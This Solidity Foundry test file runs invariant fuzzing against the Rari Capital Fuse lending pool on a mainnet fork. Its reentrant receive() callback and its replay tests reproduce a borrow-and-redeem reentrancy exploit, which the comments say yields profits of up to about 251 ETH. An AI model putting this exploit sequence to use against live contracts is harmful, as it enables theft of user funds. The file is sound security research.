// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "forge-std/Test.sol";

import "src/interfaces/IUSDC.sol";
import "src/interfaces/IcEther.sol";
import "src/interfaces/ICErc20.sol";
import "src/interfaces/IComptroller.sol";
import "src/interfaces/IRariMasterPriceOracle.sol";

contract RariAddresses {
    IUSDC usdc = IUSDC(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IcEther fEth = IcEther(payable(0x26267e41CeCa7C8E0f143554Af707336f27Fa051));
    ICErc20 fUsdc = ICErc20(0xEbE0d1cb6A0b8569929e062d67bfbC07608f0A47);
    IComptroller comptroller =
        IComptroller(0x3f2D1BC6D02522dbcdb216b2e75eDDdAFE04B16F);
    IRariMasterPriceOracle oracle =
        IRariMasterPriceOracle(0xe980EFB504269FF53F7F4BC92a2Bd1e31B43f632);
}

contract TestAccount {
    RariFuzzHandler handler;

    function setHandler(RariFuzzHandler _handler) public {
        handler = _handler;
    }

    receive() external payable {
        if (msg.sender == address(handler) || !handler.reentrancyEnabled()) {
            return;
        }

        /// Perform callback using handler fuzzed params.
        uint256 functionId = (handler.reentrancyCallback() % 6) + 1;

        if (functionId == 1) {
            handler.mint(handler.reentrancyUint0());
        } else if (functionId == 2) {
            handler.redeem(handler.reentrancyUint0());
        } else if (functionId == 3) {
            handler.borrow(handler.reentrancyUint0());
        } else if (functionId == 4) {
            handler.repay(handler.reentrancyUint0());
        } else if (functionId == 5) {
            handler.exitMarket();
        } else if (functionId == 6) {
            handler.accrueInterest();
        }
    }
}

contract RariFuzzHandler is RariAddresses, Test {
    address public ACCOUNT1;

    bool public reentrancyEnabled;
    uint8 public reentrancyCallback;
    uint256 public reentrancyUint0;

    constructor(address account1) {
        ACCOUNT1 = account1;
    }

    function mint(uint256 amount) public {
        amount = amount % (usdc.balanceOf(ACCOUNT1) + 1);

        vm.prank(ACCOUNT1);
        fUsdc.mint(amount);
    }

    function redeem(uint256 amount) public {
        uint256 underlyingBalance = fUsdc.balanceOfUnderlying(ACCOUNT1);
        amount = amount % (underlyingBalance + 1);

        vm.prank(ACCOUNT1);
        fUsdc.redeemUnderlying(amount);
    }

    function borrow(uint256 amount) public {
        address[] memory ctokens = new address[](1);
        ctokens[0] = address(fUsdc);
        vm.prank(ACCOUNT1);
        comptroller.enterMarkets(ctokens);

        (, uint256 liquidity, ) = comptroller.getAccountLiquidity(ACCOUNT1);
        amount = amount % (liquidity + 1);

        vm.prank(ACCOUNT1);
        fEth.borrow(amount);
    }

    function repay(uint256 amount) public {
        uint256 borrowed = fEth.borrowBalanceCurrent(ACCOUNT1);
        amount = amount % (borrowed + 1);

        vm.prank(ACCOUNT1);
        fEth.repayBorrow{value: amount}();
    }

    function exitMarket() public {
        vm.prank(ACCOUNT1);
        comptroller.exitMarket(address(fUsdc));
    }

    function accrueInterest() public {
        fUsdc.accrueInterest();
        fEth.accrueInterest();
    }

    /// REENTRANCY
    function setReentrancyEnabled(bool _enabled) public {
        reentrancyEnabled = _enabled;
    }

    function setReentrancyCallback(uint8 _callback) public {
        reentrancyCallback = _callback;
    }

    function setReentrancyUint0(uint256 _uint0) public {
        reentrancyUint0 = _uint0;
    }

    function getAccountBalance() public view returns (uint256 value) {
        uint256 ethDecimals = 18;
        uint256 usdcDecimals = 6;

        uint256 ethBalance = ACCOUNT1.balance;
        uint256 usdcBalance = usdc.balanceOf(ACCOUNT1);

        uint256 ethPrice = 1 ether;
        uint256 usdcPrice = oracle.price(address(usdc));

        uint256 ethValue = (ethBalance * ethPrice) / (10**ethDecimals);
        uint256 usdcValue = (usdcBalance * usdcPrice) / (10**usdcDecimals);

        value = ethValue + usdcValue;
    }
}

contract RariTest is RariAddresses, Test {
    int256 constant PROFIT_TARGET = 1 ether;

    uint256 constant STARTING_TOKEN_BALANCE = 1_000_000_000e6;
    uint256 constant STARTING_ETH_BALANCE = 1000 ether;

    uint256 account1InitialBalance;

    RariFuzzHandler handler;
    TestAccount account1;

    function setUp() public {
        vm.createSelectFork(vm.envString("ETH_RPC_URL"), 14684813);

        // Create test account.
        account1 = new TestAccount();
        address account1Address = address(account1);
        vm.label(account1Address, "Account1");

        // Create handler contract to fuzz.
        handler = new RariFuzzHandler(account1Address);
        account1.setHandler(handler);

        // Fund test account with ETH and USDC and approve fUsdc spender.
        vm.deal(account1Address, STARTING_ETH_BALANCE);
        deal(address(usdc), account1Address, STARTING_TOKEN_BALANCE);
        vm.prank(account1Address);
        usdc.approve(address(fUsdc), type(uint256).max);

        account1InitialBalance = handler.getAccountBalance();

        targetContract(address(handler));
    }

    /// forge-config: default.invariant.runs = 1000
    /// forge-config: default.invariant.depth = 25
    function invariant_test_profit() public {
        checkInvariant();
    }

    function afterInvariant() public {
        handler.exitMarket();
        checkInvariant();
    }

    function checkInvariant() internal {
        int256 account1Profit = int256(handler.getAccountBalance()) -
            int256(account1InitialBalance);

        vm.writeLine(
            "logFile.txt",
            string.concat("account1Profit:::", vm.toString(account1Profit))
        );
        require(account1Profit <= PROFIT_TARGET, "Account1 profit!");
    }

    /// Unit tests for sequences to reproduce issue.

    /// Original sequence from https://github.com/rappie/echidna-rari-hack.
    function testRariReproEchidna() public {
        handler.setReentrancyEnabled(true);
        handler.mint(
            10089325332519370949262917519849428342404732088146691233195543578618300570336
        );
        handler.setReentrancyCallback(4);
        handler.borrow(1164710473815707741);
        handler.redeem(995200615491);
        checkInvariant();
    }

    /// Sequence yielding a profit of 14.042565409259645499 ETH.
    function testRariReproFoundry() public {
        handler.setReentrancyEnabled(true);
        handler.mint(34480686646904748734687845775862632361229606401142);
        handler.redeem(146819705882536770626717166753626284388);
        handler.redeem(12060);
        handler.redeem(4183609847315272917562030534181);
        handler.redeem(122731788134496338);
        handler.redeem(21265);
        handler.redeem(9343);
        handler.redeem(
            54614006384459053945509674884461949487903176697932797427761530591
        );
        handler.redeem(2212145813418856138753290481425584633259254370);
        handler.setReentrancyCallback(4);
        handler.borrow(4760753135904324988326715789554485535);
        handler.redeem(447649540520714);
        checkInvariant();
    }

    /// Sequence yielding a profit of 251.092507969757790482 ETH.
    function testRariReproFoundry1() public {
        handler.setReentrancyEnabled(true);
        handler.mint(45778455268918263640951207098);
        handler.redeem(2239);
        handler.mint(908257824107570795476750864031);
        handler.mint(6605);
        handler.redeem(
            31661082072479443877711301545670601430554519912440964396920010859656321
        );
        handler.setReentrancyCallback(4);
        handler.borrow(104558218978698757946920526751204333464303325974512028);
        handler.redeem(1564938114064896760);
        checkInvariant();
    }
}
